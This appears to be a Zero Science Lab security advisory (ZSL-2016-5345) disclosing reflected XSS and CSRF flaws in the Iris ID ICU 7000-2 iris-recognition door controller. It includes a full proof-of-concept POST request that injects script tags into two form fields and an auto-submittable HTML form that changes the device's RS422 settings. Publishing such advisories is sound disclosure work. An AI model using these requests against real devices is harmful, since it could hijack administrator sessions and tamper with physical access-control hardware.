@@ -1,0 +1,149 @@
+﻿
+Iris ID IrisAccess ICU 7000-2 Multiple XSS and CSRF Vulnerabilities
+
+
+Vendor: Iris ID, Inc.
+Product web page: http://www.irisid.com
+Affected version: ICU Software: 1.00.08
+                  ICU OS: 1.3.8
+                  ICU File system: 1.3.8
+                  EIF Firmware [Channel 1]: 1.9
+                  EIF Firmware [Channel 2]: 1.9
+                  Iris TwoPi: 1.4.5
+
+Summary: The ICU 7000-2 is an optional component used when the client requires
+iris template data to be matched on the secure side of the door. When using ICU
+no data is stored in the iCAM7 Iris Reader itself. The ICU also ensures that portal
+operation can continue if the there is an interruption in communication with the
+host computer. In such circumstances, the ICU retains the records of portal activity,
+then automatically updates the host upon resumption of host communication. Every
+ICU in the iCAM4000 / 7 series runs on a LINUX OS for added reliability. Independent
+and fault tolerant, ICUs are connected up to 2 iCAMs and handle up to 100,000 users.
+
+Desc: The application is prone to multiple reflected cross-site scripting vulnerabilities
+due to a failure to properly sanitize user-supplied input to the 'HidChannelID' and
+'HidVerForPHP' POST parameters in the 'SetSmarcardSettings.php' script. Attackers can
+exploit this issue to execute arbitrary HTML and script code in a user's browser session.
+The application also allows users to perform certain actions via HTTP requests without
+performing any validity checks to verify the requests. This can be exploited to perform
+certain actions with administrative privileges if a logged-in user visits a malicious web
+site.
+
+Tested on: GNU/Linux 3.0.51 (armv7l)
+           mylighttpd v1.0
+           PHP/5.5.13
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5345
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5345.php
+
+
+06.05.2016
+
+--
+
+
+XSS PoC:
+--------
+
+POST /html/SetSmarcardSettings.php HTTP/1.1
+Host: 10.0.0.17
+Connection: close
+Content-Length: x
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzczxmPRCR0fYr2SO
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.8
+
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidChannelID"
+
+2"><script>alert(1)</script>
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidcmbBook"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="cmbBook"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidDisOffSet"
+
+13
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="txtOffSet"
+
+13
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidDataFormat"
+
+1
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidDataFormatVal"
+
+1
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="DataFormat"
+
+1
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidFileAvailable"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidEncryAlg"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="EncryAlg"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidFileType"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidIsFileSelect"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidUseAsProxCard"
+
+0
+------WebKitFormBoundaryzczxmPRCR0fYr2SO
+Content-Disposition: form-data; name="HidVerForPHP"
+
+1.00.08"><script>alert(2)</script>
+------WebKitFormBoundaryzczxmPRCR0fYr2SO--
+
+
+
+CSRF PoC:
+---------
+
+<html>
+  <body>
+    <form action="http://10.0.0.17/cgi-bin/SetRS422Settings" method="POST">
+      <input type="hidden" name="HidChannelID" value="2" />
+      <input type="hidden" name="RS422State" value="0" />
+      <input type="hidden" name="HidRS422BitsSec" value="9" />
+      <input type="hidden" name="HidRS422DataBits" value="3" />
+      <input type="hidden" name="HidRS422Parity" value="1" />
+      <input type="hidden" name="HidRS422StopBits" value="2" />
+      <input type="hidden" name="HidRS422StartCharLength" value="2" />
+      <input type="hidden" name="HidRS422EndCharLength" value="2" />
+      <input type="hidden" name="HidRS422StartOne" value="7F" />
+      <input type="hidden" name="HidRS422StartTwo" value="F7" />
+      <input type="hidden" name="HidRS422EndOne" value="0D" />
+      <input type="hidden" name="HidRS422EndTwo" value="0A" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
